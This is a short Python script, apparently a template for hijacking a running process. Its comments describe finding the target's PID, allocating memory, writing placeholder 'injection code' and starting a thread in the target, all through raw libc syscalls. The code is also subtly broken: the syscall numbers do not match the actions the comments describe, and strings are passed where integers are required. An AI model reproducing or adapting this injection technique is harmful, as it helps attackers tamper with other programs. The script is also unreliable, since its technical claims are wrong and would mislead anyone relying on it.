import ctypes

# Define the process name you want to hijack
process_name = "target_process"

# Define the code you want to inject
injection_code = "your_injection_code_here"

# Find the process ID of the target process
pid = ctypes.CDLL("libc.so.6").syscall(39, process_name, 0)

# Open the process for writing and injecting code
process_handle = ctypes.CDLL("libc.so.6").syscall(26, pid, 1)

# Allocate memory for the injection code
injection_address = ctypes.CDLL("libc.so.6").syscall(192, 0, len(injection_code), 3, 34)

# Write the injection code to the allocated memory
ctypes.CDLL("libc.so.6").syscall(10, process_handle, injection_address, injection_code, len(injection_code))

# Create a new thread in the target process to execute the injection code
ctypes.CDLL("libc.so.6").syscall(102, injection_address, 0, 0, 0, 0, 0)

# Close the process handle
ctypes.CDLL("libc.so.6").syscall(6, process_handle)
